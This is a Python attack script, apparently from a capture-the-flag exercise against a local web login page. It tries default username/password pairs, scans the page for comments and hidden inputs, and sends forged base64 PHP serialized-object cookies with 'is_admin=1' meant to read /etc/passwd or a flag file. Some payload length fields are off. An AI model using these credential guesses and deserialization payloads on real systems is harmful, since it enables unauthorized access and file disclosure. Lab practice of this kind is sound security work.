import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# When POST is made, the application processes login differently
# Let me check if the flag appears after successful login

print("[*] Testing login combinations...\n")

# Try logging in with various credentials
credentials = [
    ('admin', 'admin'),
    ('Burns', 'Burns'),
    ('administrator', 'administrator'),
    ('root', 'root'),
    ('Homer', 'Homer'),
    ('Marge', 'Marge'),
    ('Bart', 'Bart'),
    ('Lisa', 'Lisa'),
    ('Maggie', 'Maggie'),
    ('Simpson', 'Simpson'),
]

for username, password in credentials:
    resp = requests.post(base_url, data={'username': username, 'password': password})
    
    # Check response length
    if len(resp.content) != 3106:
        print(f"    {username}:{password} - {len(resp.content)}B (different!)")
        
        # Check for flag
        if "FLAG" in resp.text or "flag{" in resp.text.lower():
            flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] FLAG: {flag_match.group(1)}")
        
        # Check content
        content = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
        if content:
            print(f"    Content: {content.group(1).strip()[:200]}")

print("\n" + "="*80 + "\n")

# Check what cookies are set after POST
print("[*] Checking cookies set after POST...\n")

resp = requests.post(base_url, data={'username': 'Burns', 'password': 'Burns'})
print(f"Response cookies: {dict(resp.cookies)}")

# Follow any redirects
if resp.history:
    print(f"Redirect chain: {[r.status_code for r in resp.history]} -> {resp.status_code}")
    print(f"Final URL: {resp.url}")

print("\n" + "="*80 + "\n")

# Maybe the flag is revealed when specific conditions are met
# Let me check the source code or look for hints

print("[*] Searching for hints in HTML comments and hidden elements...\n")

resp = requests.get(base_url)

# Check for HTML comments
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
if comments:
    print(f"HTML Comments: {comments}")

# Check for JavaScript
scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.IGNORECASE | re.DOTALL)
if scripts:
    print(f"Scripts: {scripts}")

# Check for meta tags
metas = re.findall(r'<meta[^>]*>', resp.text, re.IGNORECASE)
print(f"Meta tags: {metas}")

# Check for hidden inputs
hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', resp.text, re.IGNORECASE)
if hidden:
    print(f"Hidden inputs: {hidden}")

print("\n" + "="*80 + "\n")

# Maybe the flag requires specific serialized data
# Let me try with an object that might trigger flag output

print("[*] Testing with special serialized objects...\n")

# Try stdClass with specific property names that might trigger flag
special_payloads = [
    # Maybe the flag is stored in a file
    ('stdClass_flag', 'O:8:"stdClass":1:{s:9:"show_flag";b:1;}'),
    
    # Try with filename property
    ('stdClass_file', 'O:8:"stdClass":1:{s:8:"filename";s:20:"/var/www/html/flag.txt";}'),
    
    # Try with file property
    ('stdClass_file2', 'O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}'),
]

for name, payload in special_payloads:
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    # Check for file content
    if "root:" in resp.text:
        print(f"[!!!] {name}: File content detected!")
        print(resp.text[resp.text.find("root:"):resp.text.find("root:")+200])
    
    # Check for flag
    if "FLAG" in resp.text or "flag{" in resp.text.lower():
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"[!!!] {name}: FLAG: {flag_match.group(1)}")
    
    print(f"    {name}: {len(resp.content)}B")

